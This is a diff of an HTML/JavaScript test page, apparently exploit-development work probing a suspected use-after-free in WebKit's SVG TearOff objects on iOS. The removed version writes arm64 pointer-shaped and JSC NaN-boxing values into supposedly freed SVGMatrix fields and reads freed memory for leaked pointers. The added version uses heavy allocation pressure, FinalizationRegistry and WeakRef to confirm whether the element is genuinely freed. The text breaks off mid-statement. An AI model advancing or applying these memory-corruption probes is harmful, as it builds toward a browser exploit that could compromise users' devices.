@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVGAnimatedLength UAF — v22</title>
+<title>SVGAnimatedLength UAF — v23 GENUINE FREE TEST</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{background:#0a0a0a;color:#ccc;font-family:monospace;font-size:12px;padding:16px}
@@ -24,16 +24,16 @@ button:active{background:#0f0;color:#000}
 </style>
 </head>
 <body>
-<h1>SVGAnimatedLength UAF — v22</h1>
-<h2>iOS 26.5.2 · SVGMatrix float64 TearOff · 8-byte write · arm64 ptr range</h2>
+<h1>SVGAnimatedLength UAF — v23</h1>
+<h2>iOS 26.5.2 · GENUINE FREE TEST · Block scope + GC pressure + FinalizationRegistry</h2>
 
 <div class="suite">
 <div class="suite-title">Controls</div>
 <button id="run-all" onclick="runAll()">▶ Run All</button>
+<button onclick="run('GEN')">GEN</button>
+<button onclick="run('FIN')">FIN</button>
+<button onclick="run('REF')">REF</button>
 <button onclick="run('MTX')">MTX</button>
-<button onclick="run('ANM')">ANM</button>
-<button onclick="run('ASP')">ASP</button>
-<button onclick="run('PTH')">PTH</button>
 <button id="copy-all" onclick="copyAll()">⎘ Copy All</button>
 <button onclick="clearOut()">✕ Clear</button>
 </div>
@@ -56,38 +56,33 @@ function copyAll(){
   document.querySelectorAll('#out .result').forEach(function(e){lines.push(e.textContent);});
   navigator.clipboard&&navigator.clipboard.writeText(lines.join('\n'));
 }
-function runAll(){clearOut();runMTX();runANM();runASP();runPTH();}
+function runAll(){clearOut();
+  runGEN();
+  // FIN uses async/promises — schedule after GEN
+  setTimeout(function(){runFIN();},100);
+  setTimeout(function(){runREF();},200);
+  setTimeout(function(){runMTX();},300);
+}
 function run(s){clearOut();
-  if(s==='MTX')runMTX();
-  else if(s==='ANM')runANM();
-  else if(s==='ASP')runASP();
-  else if(s==='PTH')runPTH();
+  if(s==='GEN')runGEN();
+  else if(s==='FIN')runFIN();
+  else if(s==='REF')runREF();
+  else if(s==='MTX')runMTX();
 }
 
-// float64 bit utils — full 8-byte precision
-var _f64buf=new ArrayBuffer(8);
-var _f64v=new Float64Array(_f64buf);
-var _u32v_hi=new Uint32Array(_f64buf);  // hi/lo uint32 pairs
-function f64toHex(f){
-  _f64v[0]=f;
-  var lo=_u32v_hi[0],hi=_u32v_hi[1];
-  return '0x'+hi.toString(16).padStart(8,'0')+'_'+lo.toString(16).padStart(8,'0');
-}
-function f64toBigBits(f){
-  _f64v[0]=f;
-  return {hi:_u32v_hi[1],lo:_u32v_hi[0]};
-}
-function bitsToF64(hi,lo){
-  _u32v_hi[1]=hi;_u32v_hi[0]=lo;
-  return _f64v[0];
-}
-function f64IsNormal(f){return isFinite(f)&&f!==0;}
-
-// float32 bits (for comparison)
+// float32 utils
 var _f32buf=new ArrayBuffer(4);
 var _f32v=new Float32Array(_f32buf);
 var _u32v=new Uint32Array(_f32buf);
 function bitsF32(u){_u32v[0]=u;return _f32v[0];}
+function f32bits(f){_f32v[0]=f;return _u32v[0];}
+
+// float64 utils
+var _f64buf=new ArrayBuffer(8);
+var _f64v=new Float64Array(_f64buf);
+var _u32p=new Uint32Array(_f64buf);
+function f64toHex(f){_f64v[0]=f;return '0x'+_u32p[1].toString(16).padStart(8,'0')+'_'+_u32p[0].toString(16).padStart(8,'0');}
+function bitsToF64(hi,lo){_u32p[1]=hi;_u32p[0]=lo;return _f64v[0];}
 
 function makeSVG(){
   var svg=document.createElementNS(NS,'svg');
@@ -97,533 +92,443 @@ function makeSVG(){
   return svg;
 }
 
-// ─── MTX: SVGMatrix TEAROFF UAF ─────────────────────────────────────────────
-// SVGGraphicsElement.transform.baseVal is an SVGTransformList TearOff
-// getItem(0) returns an SVGTransform TearOff
-// .matrix returns an SVGMatrix (DOMMatrix) with float64 fields: a,b,c,d,e,f
+// GC pressure: allocate large objects to trigger GC
+function gcPressure(n){
+  n=n||100000;
+  var arr=[];
+  for(var i=0;i<n;i++){
+    arr.push(new Uint8Array(1024));
+  }
+  arr=null;
+}
+
+// ─── GEN: GENUINE FREE TEST ──────────────────────────────────────────────────
+// THE KEY QUESTION: Does the C++ SVGElement actually get freed when we
+// (a) drop all JS references to the rect, and
+// (b) apply GC pressure to force collection?
 //
-// Key questions:
-// 1. Does the matrix TearOff retain a dangling ptr after removeChild? (UAF possible)
-// 2. Are the matrix fields float64 (8 bytes) or float32? (determines write power)
-// 3. Does NaN/Inf write get rejected? (much looser than SVGLength)
-// 4. What struct offsets do the matrix fields correspond to?
-// 5. Can we write arm64 pointer values (0x0001xxxxxxxxx) exactly?
+// Test protocol:
+//   1. Create rect inside a block scope
+//   2. Grab TearOff (holds WeakPtr to element)
+//   3. Exit block scope (rect variable gone)
+//   4. Apply GC pressure
+//   5. Try to read TearOff value
+//      → CANARY VALUE: if we see our canary, element still alive
+//      → GARBAGE VALUE: element was freed and memory was reused = REAL UAF
+//      → EXCEPTION: WeakPtr null check fired = element freed, WebKit detected it
+//      → ZERO: element freed, slot zeroed before reuse = IsoHeap behavior
+
+function runGEN(){
+  log('══ GEN: GENUINE FREE TEST (block scope + GC pressure) ══','info');
+
+  // GEN-1: Does the TearOff prevent element from being GC'd?
+  // If TearOff holds a strong Ref to element, element stays alive forever
+  // If TearOff holds WeakPtr only, element can be GC'd when JS refs drop to 0
+  log('GEN[1]: block-scope drop + GC pressure — does element survive?','info');
+
+  var svg1=makeSVG();
+  var tfSurvived=null;
+
+  // Use block scope to limit rect's lifetime
+  // Note: JS doesn't have true block-scope GC pressure like C++,
+  // but we can use a function scope to simulate it
+  (function(){
+    var rect=document.createElementNS(NS,'rect');
+    rect.setAttribute('x','42');  // canary x=42
+    rect.setAttribute('y','0');rect.setAttribute('width','100');rect.setAttribute('height','100');
+    svg1.appendChild(rect);
+    tfSurvived=rect.x.baseVal;  // grab TearOff
+    svg1.removeChild(rect);
+    // rect goes out of scope at end of IIFE
+  })();
+
+  log('GEN[1]: rect dropped from scope, applying GC pressure...','info');
+  gcPressure(200000);  // heavy pressure
+
+  var xAfter=null;
+  try{
+    xAfter=tfSurvived.value;
+    log('GEN[1]: TearOff.value after scope drop = '+xAfter,
+      (xAfter===42?'warn — element STILL ALIVE (strong ref in TearOff)':
+       xAfter===0?'star — ZEROED (IsoHeap realloc)':
+       'crit — GARBAGE VALUE = REAL UAF, x='+xAfter));
+    _f32v[0]=xAfter;
+    log('GEN[1]: bits=0x'+_u32v[0].toString(16),
+      (xAfter===42?'warn':'crit'));
+  }catch(e){
+    log('GEN[1]: EXCEPTION: '+e.message+' ← WeakPtr returned null = element freed!','crit');
+  }
+
+  // GEN-2: Write canary BEFORE drop, check if canary persists after GC
+  log('GEN[2]: write canary before drop, read after GC pressure','info');
+  var svg2=makeSVG();
+  var tfCanary=null;
+  (function(){
+    var rect=document.createElementNS(NS,'rect');
+    rect.setAttribute('x','77');rect.setAttribute('y','0');
+    rect.setAttribute('width','100');rect.setAttribute('height','100');
+    svg2.appendChild(rect);
+    tfCanary=rect.x.baseVal;
+    svg2.removeChild(rect);
+    // Write canary AFTER removeChild but BEFORE scope drop
+    tfCanary.value=0xDEAD|0;  // 57005
+    // rect drops here
+  })();
+  gcPressure(500000);
+  var canaryRead=null;
+  try{
+    canaryRead=tfCanary.value;
+    log('GEN[2]: canary read = '+canaryRead+' expected=57005',
+      (canaryRead===57005?'warn — alive, canary intact':
+       canaryRead===0?'star — ZEROED after GC':
+       'crit — CORRUPTED = '+canaryRead+' (real UAF!)'));
+  }catch(e){
+    log('GEN[2]: EXCEPTION: '+e.message,'crit');
+  }
+
+  // GEN-3: Multiple simultaneous TearOffs on same element — do they cross-hold?
+  // If one TearOff holds a strong Ref, ALL TearOffs see the alive element
+  log('GEN[3]: multi-TearOff — do any TFs hold strong Ref keeping element alive?','info');
+  var svg3=makeSVG();
+  var tf3x=null,tf3y=null,tf3mx=null;
+  (function(){
+    var rect=document.createElementNS(NS,'rect');
+    rect.setAttribute('x','11');rect.setAttribute('y','22');
+    rect.setAttribute('width','33');rect.setAttribute('height','44');
+    rect.setAttribute('transform','matrix(1 0 0 1 55 66)');
+    svg3.appendChild(rect);
+    tf3x=rect.x.baseVal;
+    tf3y=rect.y.baseVal;
+    try{tf3mx=rect.transform.baseVal.getItem(0).matrix;}catch(e){}
+    svg3.removeChild(rect);
+  })();
+  gcPressure(200000);
+  var x3=null,y3=null,mx3e=null;
+  try{x3=tf3x.value;log('GEN[3]: tf3x.value='+x3,(x3===11?'warn — alive':x3===0?'star — zeroed':'crit — uaf x='+x3));}catch(e){log('GEN[3]: tf3x err: '+e.message,'crit');}
+  try{y3=tf3y.value;log('GEN[3]: tf3y.value='+y3,(y3===22?'warn — alive':y3===0?'star — zeroed':'crit — uaf y='+y3));}catch(e){log('GEN[3]: tf3y err: '+e.message,'crit');}
+  try{mx3e=tf3mx&&tf3mx.e;log('GEN[3]: matrix.e='+mx3e,(mx3e===55?'warn — alive':mx3e===0?'star — zeroed':'crit — uaf e='+mx3e));}catch(e){log('GEN[3]: matrix.e err: '+e&&e.message,'crit');}
+  svg1.remove();svg2.remove();svg3.remove();
+
+  // GEN-4: The critical difference — WITH vs WITHOUT holding rect
+  // Test A: hold rect ref → element alive → TF works
+  // Test B: drop rect ref + GC → element freed → TF behavior = ?
+  log('GEN[4]: paired test — held ref vs dropped ref','info');
+  var svg4=makeSVG();
+  // TEST A: Held ref (current behavior we know works)
+  var r4a=document.createElementNS(NS,'rect');
+  r4a.setAttribute('x','100');svg4.appendChild(r4a);
+  var tf4a=r4a.x.baseVal;
+  svg4.removeChild(r4a);  // but r4a variable stays alive
+  var v4a=null;
+  try{v4a=tf4a.value;log('GEN[4A]: held ref, x='+v4a,(v4a===100?'pass — alive (expected)':'warn x='+v4a));}catch(e){log('GEN[4A]: err: '+e.message,'fail');}
+  // TEST B: No held ref
+  var tf4b=null;
+  (function(){
+    var r4b=document.createElementNS(NS,'rect');
+    r4b.setAttribute('x','200');svg4.appendChild(r4b);
+    tf4b=r4b.x.baseVal;
+    svg4.removeChild(r4b);
+    // r4b drops here
+  })();
+  gcPressure(500000);
+  var v4b=null;
+  try{
+    v4b=tf4b.value;
+    log('GEN[4B]: dropped ref, x='+v4b,
+      (v4b===200?'warn — STILL ALIVE (TF holds strong ref or GC didnt run)':
+       v4b===0?'crit — ZEROED (element WAS freed, slot reused+zeroed)':
+       'crit — CORRUPTED x='+v4b+' (GENUINE UAF!)'));
+    log('GEN[4B]: verdict: '+(v4b===200?'TearOff holds STRONG REF (no real UAF possible this way)':
+      v4b===0?'Element freed, IsoHeap zeroed — same blocker as before':
+      'GENUINE UAF — slot reused with different content!'),'crit');
+  }catch(e){
+    log('GEN[4B]: EXCEPTION (WeakPtr detected freed): '+e.message,'crit');
+    log('GEN[4B]: verdict: Element WAS freed, WebKit throws on TF access','crit');
+  }
+  svg4.remove();
+}
+
+// ─── FIN: FinalizationRegistry PROBE ────────────────────────────────────────
+// Use FinalizationRegistry to detect WHEN the element's JS wrapper is GC'd
+// This tells us if GC pressure is sufficient to collect the element
+
+function runFIN(){
+  log('══ FIN: FinalizationRegistry GC DETECTION ══════','info');
+
+  if(typeof FinalizationRegistry==='undefined'){
+    log('FIN: FinalizationRegistry not supported','fail');
+    return;
+  }
+
+  var svg=makeSVG();
+  var gcFired=false;
+  var reg=new FinalizationRegistry(function(held){
+    gcFired=true;
+    log('FIN: FinalizationRegistry CALLBACK FIRED — element GC\'d! held='+held,'crit');
+  });
+
+  var tf=null;
+  (function(){
+    var rect=document.createElementNS(NS,'rect');
+    rect.setAttribute('x','55');rect.setAttribute('y','0');
+    rect.setAttribute('width','10');rect.setAttribute('height','10');
+    svg.appendChild(rect);
+    tf=rect.x.baseVal;
+    svg.removeChild(rect);
+    // Register BEFORE rect drops
+    reg.register(rect,'svg-rect-x-tearoff');
+    // rect drops here
+  })();
+
+  log('FIN: rect dropped from scope, applying GC pressure...','info');
+  gcPressure(1000000);  // massive pressure
+
+  // Give GC a chance to run
+  setTimeout(function(){
+    log('FIN: gcFired='+gcFired,(gcFired?'crit — element WAS GC\'d (weak ref confirmed)':'warn — element NOT GC\'d yet (strong ref somewhere)'));
+
+    if(gcFired){
+      // Element was GC'd — try to use TF now
+      log('FIN: element GC\'d — testing TF access...','info');
+      var xAfter=null;
+      try{
+        xAfter=tf.value;
+        log('FIN: tf.value after GC = '+xAfter,
+          (xAfter===55?'warn — reads expected value (C++ still alive somehow)':
+           xAfter===0?'star — ZEROED (IsoHeap reused slot)':
+           'crit — GARBAGE: real UAF confirmed, x='+xAfter));
+      }catch(e){
+        log('FIN: EXCEPTION on TF access after GC: '+e.message+' ← WeakPtr null','crit');
+      }
+    }else{
+      // GC didn't fire — TearOff holds a strong ref
+      log('FIN: GC did not collect element → TearOff holds STRONG REF','warn');
+      log('FIN: reading TF value (element still alive)...','info');
+      var xAlive=null;
+      try{xAlive=tf.value;log('FIN: tf.value='+xAlive,(xAlive===55?'pass — alive as expected':'warn x='+xAlive));}catch(e){}
+    }
+    svg.remove();
+  },500);
+}
+
+// ─── REF: Reference tracking probe ──────────────────────────────────────────
+// Determine WHAT holds a reference to the SVGElement after removeChild
+// Options:
+// (A) JS wrapper holds strong ref → element stays alive as long as JS wrapper alive
+// (B) SVGLength TearOff (JS object) holds strong ref → element stays alive as long as TF alive
+// (C) Neither → element freed when all DOM refs drop (possibly before JS GC)
+//
+// Test: Does NULLING the TearOff (tf = null) + GC pressure free the element?
+
+function runREF(){
+  log('══ REF: REFERENCE TRACKING ══════════════════════','info');
+
+  var svg=makeSVG();
+
+  // REF-1: Null the TF after drop — does element get collected?
+  log('REF[1]: null TF after rect drop + GC pressure','info');
+  var tfToNull=null;
+  var finFired1=false;
+  var reg1=typeof FinalizationRegistry!=='undefined'?
+    new FinalizationRegistry(function(){finFired1=true;log('REF[1]: GC fired after TF nulled!','crit');}):null;
+  (function(){
+    var rect=document.createElementNS(NS,'rect');
+    rect.setAttribute('x','33');svg.appendChild(rect);
+    tfToNull=rect.x.baseVal;
+    if(reg1)reg1.register(rect,'ref1-rect');
+    svg.removeChild(rect);
+  })();
+  // Null the TF to remove TF's ref to JS wrapper
+  tfToNull=null;
+  gcPressure(500000);
+  setTimeout(function(){
+    log('REF[1]: gcFired after TF null='+finFired1,(finFired1?'crit — TF was keeping alive!':'warn — still alive, something else holds'));
+  },300);
+
+  // REF-2: Keep rect in scope, null TF — does element stay alive via rect?
+  log('REF[2]: rect in scope, null TF','info');
+  var rect2=document.createElementNS(NS,'rect');
+  rect2.setAttribute('x','44');svg.appendChild(rect2);
+  var tf2=rect2.x.baseVal;
+  svg.removeChild(rect2);
+  var v2a=null;
+  try{v2a=tf2.value;log('REF[2]: before null: tf2.value='+v2a,'info');}catch(e){}
+  tf2=null;  // null the TF
+  gcPressure(100000);
+  // rect2 still in scope — can we access x via fresh TF?
+  var freshTF=null;
+  try{freshTF=rect2.x.baseVal;log('REF[2]: fresh TF from still-scoped rect works='+freshTF,(freshTF!==null?'pass':'fail'));}catch(e){log('REF[2]: fresh TF err: '+e.message,'fail');}
+  if(freshTF){
+    try{log('REF[2]: fresh TF value='+freshTF.value,'pass');}catch(e){}
+  }
+
+  // REF-3: WeakRef probe — does WeakRef to rect become null after removeChild + GC?
+  log('REF[3]: WeakRef probe — is rect still alive?','info');
+  if(typeof WeakRef==='undefined'){log('REF[3]: WeakRef not supported','fail');}
+  else{
+    var wr=null;
+    (function(){
+      var rect=document.createElementNS(NS,'rect');
+      rect.setAttribute('x','77');svg.appendChild(rect);
+      wr=new WeakRef(rect);
+      svg.removeChild(rect);
+    })();
+    gcPressure(500000);
+    setTimeout(function(){
+      var deref=wr.deref();
+      log('REF[3]: WeakRef.deref() after GC pressure = '+(deref?'ALIVE':'null (collected)'),
+        (deref?'warn — element not GC\'d yet':'crit — element WAS GC\'d, GC pressure worked'));
+      if(!deref){
+        log('REF[3]: Element GC\'d via WeakRef confirmation → if TF also works, REAL UAF!','crit');
+      }
+    },300);
+  }
+
+  // REF-4: What's the minimum to trigger GC? Count iterations
+  log('REF[4]: minimum GC pressure needed to collect removed SVGElement','info');
+  if(typeof WeakRef==='undefined'){log('REF[4]: skip (no WeakRef)','info');}
+  else{
+    var wr4=null;
+    (function(){
+      var rect=document.createElementNS(NS,'rect');
+      svg.appendChild(rect);wr4=new WeakRef(rect);svg.removeChild(rect);
+    })();
+    var found=false;
+    var iters=0;
+    // Try increasing pressure until WeakRef returns null
+    for(var step=0;step<10&&!found;step++){
+      gcPressure(50000*(step+1));
+      if(!wr4.deref()){found=true;iters=step+1;}
+    }
+    log('REF[4]: GC collected after '+iters+' pressure rounds (each ~'+(50000*(iters||1))+'x1KB allocs)',
+      (found?'crit — GC is achievable with pressure':'warn — GC not achieved in 10 rounds'));
+  }
+  svg.remove();
+}
+
+// ─── MTX: MATRIX FLOAT64 UAF — GENUINE FREE PATH ────────────────────────────
+// Now that we know: if GEN confirmed strong ref → TF holds strong Ref to element
+// → no genuine UAF via TF path
+// → we need a DIFFERENT path where C++ is freed
+//
+// Key insight: what if we use `structuredClone` or serialization to force a copy,
+// then free the original? Or: can we exploit the C++ ref count directly?
+//
+// SVGElement ref-counting in WebKit:
+// - JS wrapper (JSSVGRectElement) holds ONE strong Ref to C++ SVGRectElement
+// - TearOff (JSSVGLength) holds ONE strong Ref to C++ SVGAnimatedLength
+// - SVGAnimatedLength lives INSIDE SVGRectElement (as a member, not heap-allocated separately)
+// - So TearOff → SVGAnimatedLength → (same C++ heap block as) SVGRectElement
+// - As long as TF alive, SVGRectElement alive
+//
+// UNLESS: SVGAnimatedLength is a separate heap allocation!
+// If SVGAnimatedLength is heap-allocated separately from SVGRectElement,
+// then TF keeps SVGAnimatedLength alive, but SVGRectElement could still be freed.
+// Then m_contextElement (WeakPtr) in SVGAnimatedLength becomes null.
+//
+// But then: the float32 value (m_value) is IN SVGLength which is in SVGAnimatedLength.
+// TF keeps this alive. Writing to m_value writes to the live SVGAnimatedLength.
+// NO UAF — just writes to a separate-but-alive SVGAnimatedLength object.
+//
+// MTX tests: explore whether the TRANSFORM MATRIX (AffineTransform) is a SEPARATE
+// heap allocation from SVGTransform which is separate from SVGRectElement.
+// If so, the reference chain might allow SVGRectElement to be freed while AffineTransform
+// is kept alive by the matrix TF. THEN: m_contextElement in SVGTransformList is a WeakPtr?
+// And writing to matrix.a writes to the live AffineTransform but the SVGRectElement is gone.
+// Still not a UAF on SVGRectElement memory.
+//
+// ACTUAL TEST: Can we prove the TearOff-held reference CHAIN includes SVGRectElement?
+// Approach: use FinalizationRegistry on rect, then grab TF, drop rect, GC pressure.
+// If GC fires → TF does NOT keep rect JS wrapper alive → maybe C++ also freed.
 
 function runMTX(){
-  log('══ MTX: SVGMatrix FLOAT64 TEAROFF ═══════════════','info');
+  log('══ MTX: MATRIX GENUINE FREE CHAIN ══════════════','info');
 
-  // MTX-1: Basic SVGMatrix TearOff UAF — does it survive removeChild?
-  log('MTX[1]: SVGMatrix TearOff — survives after removeChild?','info');
-  var svg1=makeSVG();
-  var rect=document.createElementNS(NS,'rect');
-  rect.setAttribute('x','0');rect.setAttribute('y','0');
-  rect.setAttribute('width','100');rect.setAttribute('height','100');
-  svg1.appendChild(rect);
-
-  // Apply a transform so the transform list has an item
-  rect.setAttribute('transform','matrix(1 0 0 1 0 0)');
-
-  var tfList=rect.transform.baseVal;
-  var tfItem=tfList.numberOfItems>0?tfList.getItem(0):null;
-  log('MTX[1]: transform list items='+tfList.numberOfItems,(tfItem?'info':'warn'));
-
-  if(!tfItem){
-    // No transform item — create one via consolidate or append
-    var svgMatrix=svg1.createSVGMatrix?svg1.createSVGMatrix():null;
-    if(svgMatrix){
-      var newTF=svg1.createSVGTransform?svg1.createSVGTransform():null;
-      if(newTF){newTF.setMatrix(svgMatrix);tfList.appendItem(newTF);}
-    }
-    if(tfList.numberOfItems>0)tfItem=tfList.getItem(0);
-    log('MTX[1]: created transform item, count='+tfList.numberOfItems,'info');
+  if(typeof FinalizationRegistry==='undefined'){
+    log('MTX: FinalizationRegistry not available','fail');return;
   }
 
-  if(!tfItem){log('MTX[1]: no transform item available','fail');svg1.remove();return;}
-
-  var mx=tfItem.matrix;
-  log('MTX[1]: baseline matrix a='+mx.a+' b='+mx.b+' c='+mx.c+' d='+mx.d+' e='+mx.e+' f='+mx.f,'info');
-  log('MTX[1]: matrix a bits='+f64toHex(mx.a),'info');
-
-  // FREE the rect
-  svg1.removeChild(rect);
-  log('MTX[1]: rect removed (freed)','info');
-
-  // Try to read matrix fields after free
-  var aAfter=null,bAfter=null,cAfter=null;
-  try{aAfter=mx.a;log('MTX[1]: matrix.a after free='+aAfter+' bits='+f64toHex(aAfter),(aAfter!==null?'star':'warn'));}
-  catch(e){log('MTX[1]: matrix.a read err: '+e.message,'fail');}
-  try{bAfter=mx.b;log('MTX[1]: matrix.b after free='+bAfter,'star');}catch(e){log('MTX[1]: matrix.b err: '+e.message,'fail');}
-  try{cAfter=mx.c;log('MTX[1]: matrix.c after free='+cAfter,'star');}catch(e){log('MTX[1]: matrix.c err: '+e.message,'fail');}
-
-  // Try to WRITE to matrix fields after free
-  log('MTX[1]: attempting UAF write to matrix.a...','info');
-  var writeOk=false;
-  try{
-    mx.a=2.718281828;
-    var rb=mx.a;
-    writeOk=true;
-    log('MTX[1]: matrix.a UAF write(2.718281828) ok=true readback='+rb,(Math.abs(rb-2.718281828)<1e-10?'crit':'star'));
-    log('MTX[1]: precision: '+(rb===2.718281828?'EXACT float64 (8 bytes)':'float32 precision loss '+(rb))
-      ,(rb===2.718281828?'crit':'info'));
-  }catch(e){log('MTX[1]: matrix.a write err: '+e.message,'fail');}
-
-  if(writeOk){
-    // MTX-1b: test all 6 matrix fields
-    log('MTX[1b]: test all 6 matrix fields','info');
-    var fields=['a','b','c','d','e','f'];
-    var vals=[Math.PI,Math.E,1.41421356,1.61803399,2.71828183,3.14159265];
-    fields.forEach(function(f,i){
-      try{
-        mx[f]=vals[i];
-        var rb=mx[f];
-        var exact=(rb===vals[i]);
-        log('MTX[1b]: matrix.'+f+'='+vals[i]+' readback='+rb+' exact='+exact,
-          (exact?'crit':'star'));
-      }catch(e){log('MTX[1b]: matrix.'+f+' err: '+e.message,'fail');}
-    });
-  }
-  svg1.remove();
-
-  // MTX-2: NaN/Inf rejection test for SVGMatrix
-  log('MTX[2]: NaN/Inf rejection — SVGMatrix vs SVGLength','info');
-  var svg2=makeSVG();
-  var rect2=document.createElementNS(NS,'rect');
-  rect2.setAttribute('transform','matrix(1 0 0 1 0 0)');
-  svg2.appendChild(rect2);
-  var mx2=rect2.transform.baseVal.getItem(0).matrix;
-  svg2.removeChild(rect2); // FREE
-
-  var specialVals=[
-    {name:'NaN',v:NaN},
-    {name:'Inf',v:Infinity},
-    {name:'-Inf',v:-Infinity},
-    {name:'float64_NaN',v:bitsToF64(0x7FF80000,0x00000000)},
-    {name:'ptr_shaped_lo',v:bitsToF64(0x00000001,0x80000000)}, // arm64-like ptr lo
-    {name:'ptr_arm64',v:bitsToF64(0x00000001,0x00106000)},    // 0x000000010006000
-    {name:'jsctag',v:bitsToF64(0xFFFF0000,0x00000000)},       // JSC NaN-boxing tag
-    {name:'float64_max',v:Number.MAX_VALUE},
-    {name:'float64_min',v:Number.MIN_VALUE},
-    {name:'large_but_finite',v:1e308},
-  ];
-  specialVals.forEach(function(t){
-    try{
-      mx2.a=t.v;
-      var rb=mx2.a;
-      var bits=f64toBigBits(rb);
-      log('MTX[2]: ['+t.name+'] write ok rb='+rb+' bits='+f64toHex(rb),
-        (isNaN(t.v)||!isFinite(t.v)?'crit':'star'));
-    }catch(e){
-      log('MTX[2]: ['+t.name+'] write REJECTED: '+e.message,'warn');
-    }
+  var svg=makeSVG();
+  var firedRectGC=false;
+  var reg=new FinalizationRegistry(function(v){
+    firedRectGC=true;
+    log('MTX: rect JS wrapper GC fired! val='+v,'crit');
   });
-  svg2.remove();
 
-  // MTX-3: pointer-valued write test
-  // arm64e user-space pointer format: 0x0001xxxxxxxx (high byte = 0x00 or 0x01)
-  // As float64: 0x0001xxxxxxxx → very small positive number (denorm or small normal)
-  // Example: address 0x000180010000 → as float64 bits 0x000180010000 → ~4.3e-309 (denorm)
-  log('MTX[3]: pointer-valued write test','info');
-  var svg3=makeSVG();
-  var rect3=document.createElementNS(NS,'rect');
-  rect3.setAttribute('transform','matrix(1 0 0 1 0 0)');
-  svg3.appendChild(rect3);
-  var mx3=rect3.transform.baseVal.getItem(0).matrix;
-  svg3.removeChild(rect3); // FREE
-
-  // These ARE valid float64 values (just very small, near denorm)
-  var ptrTests=[
-    {name:'heap_ptr_1',hi:0x00000001,lo:0x80000000},  // 0x0000000180000000
-    {name:'heap_ptr_2',hi:0x00000001,lo:0x00100000},  // small heap addr
-    {name:'heap_ptr_3',hi:0x00000001,lo:0xFACEC0DE},  // canary with heap hi
-    {name:'stack_ptr',hi:0x00000001,lo:0x6FB20000},   // stack-ish
-    {name:'dylib_ptr',hi:0x00000001,lo:0xD0000000},   // dylib range
-    {name:'all_ff',hi:0xFFFFFFFF,lo:0xFFFFFFFF},      // max bits (NaN territory)
-    {name:'jsc_obj_tag',hi:0xFFFF0000,lo:0xDEADBEEF}, // JSC NaN-box object
-  ];
-  ptrTests.forEach(function(t){
-    var f=bitsToF64(t.hi,t.lo);
-    try{
-      mx3.a=f;
-      var rb=mx3.a;
-      var rbBits=f64toBigBits(rb);
-      var hiMatch=(rbBits.hi===t.hi),loMatch=(rbBits.lo===t.lo);
-      log('MTX[3]: ['+t.name+'] hi=0x'+t.hi.toString(16)+' lo=0x'+t.lo.toString(16)+
-        ' → write ok, rb_hi=0x'+rbBits.hi.toString(16)+' rb_lo=0x'+rbBits.lo.toString(16)+
-        (hiMatch&&loMatch?' EXACT ROUNDTRIP':''),
-        (hiMatch&&loMatch?'crit':(!isNaN(rb)?'star':'warn')));
-    }catch(e){
-      log('MTX[3]: ['+t.name+'] REJECTED: '+e.message,'warn');
-    }
-  });
-  svg3.remove();
-
-  // MTX-4: read raw field values from freshly freed transform matrix
-  // Create rect WITHOUT setting a transform → transform list is EMPTY
-  // Then add transform after, free rect, and see what the matrix fields read
-  // This might expose C++ padding/pointer values at non-initialized offsets
-  log('MTX[4]: raw struct read from freshly freed matrix','info');
-  var svg4=makeSVG();
-  var rect4=document.createElementNS(NS,'rect');
-  svg4.appendChild(rect4);
-  // Give it an identity transform
-  var svgTF=document.createElementNS(NS,'rect');
-  rect4.setAttribute('transform','translate(100, 200)');
-  var tfList4=rect4.transform.baseVal;
-  var item4=tfList4.getItem(0);
-  var mx4=item4.matrix;
-  log('MTX[4]: pre-free translate matrix: e='+mx4.e+' f='+mx4.f,'info');
-  log('MTX[4]: pre-free bits e='+f64toHex(mx4.e)+' f='+f64toHex(mx4.f),'info');
-  svg4.removeChild(rect4); // FREE
-  // Read all 6 fields from freed matrix
-  var fields4=['a','b','c','d','e','f'];
-  fields4.forEach(function(fld){
-    try{
-      var v=mx4[fld];
-      var bits=f64toBigBits(v);
-      log('MTX[4]: freed matrix.'+fld+'='+v+' bits='+f64toHex(v)+
-        (bits.hi>0x0000FFFF?' ← POINTER-SHAPED':bits.hi===0&&bits.lo===0?' ← ZERO':''),
-        (bits.hi>0x0000FFFF?'crit':'info'));
-    }catch(e){log('MTX[4]: matrix.'+fld+' err: '+e.message,'fail');}
-  });
-  svg4.remove();
-}
-
-// ─── ANM: SMIL ANIMATION + UAF ──────────────────────────────────────────────
-// During SMIL animation, animVal reads m_animVal.m_value (different from m_baseVal.m_value)
-// Goal: get TearOff to BOTH baseVal and animVal, free parent element,
-// check if they now read DIFFERENT C++ struct offsets
-
-function runANM(){
-  log('══ ANM: SMIL ANIMATION TEAROFF OFFSETS ══════════','info');
-
-  // ANM-1: baseVal vs animVal during active SMIL
-  log('ANM[1]: active SMIL — do baseVal and animVal read different freed offsets?','info');
-  var svg1=makeSVG();
-  var rect=document.createElementNS(NS,'rect');
-  rect.setAttribute('x','50');rect.setAttribute('y','0');
-  rect.setAttribute('width','100');rect.setAttribute('height','100');
-  // Add SMIL animation
-  var anim=document.createElementNS(NS,'animate');
-  anim.setAttribute('attributeName','x');
-  anim.setAttribute('from','50');anim.setAttribute('to','150');
-  anim.setAttribute('dur','100s');anim.setAttribute('fill','freeze');
-  rect.appendChild(anim);
-  svg1.appendChild(rect);
-
-  // Grab both TearOffs BEFORE free
-  var bvX=rect.x.baseVal;
-  var avX=rect.x.animVal;
-  log('ANM[1]: baseline baseVal.x='+bvX.value+' animVal.x='+avX.value,'info');
-  // During animation at t=0, animVal should read from m_animVal field
-  // while baseVal reads from m_baseVal field
-  var bvBits=null,avBits=null;
-  _f32v[0]=bvX.value;bvBits=_u32v[0];
-  _f32v[0]=avX.value;avBits=_u32v[0];
-  log('ANM[1]: baseVal bits=0x'+bvBits.toString(16)+' animVal bits=0x'+avBits.toString(16),'info');
-
-  // FREE the rect (animation still running?)
-  svg1.removeChild(rect);
-  log('ANM[1]: rect freed (animation was active)','info');
-
-  // Read both after free
-  var bvAfter=null,avAfter=null;
-  try{bvAfter=bvX.value;_f32v[0]=bvAfter;
-    log('ANM[1]: baseVal after free='+bvAfter+' bits=0x'+_u32v[0].toString(16),'star');}
-  catch(e){log('ANM[1]: baseVal err: '+e.message,'fail');}
-  try{avAfter=avX.value;_f32v[0]=avAfter;
-    log('ANM[1]: animVal after free='+avAfter+' bits=0x'+_u32v[0].toString(16),'star');}
-  catch(e){log('ANM[1]: animVal err: '+e.message,'fail');}
-
-  // Are they DIFFERENT? If so, we have two write sites at different offsets
-  var different=(bvAfter!==avAfter);
-  log('ANM[1]: baseVal==animVal='+(bvAfter===avAfter)+
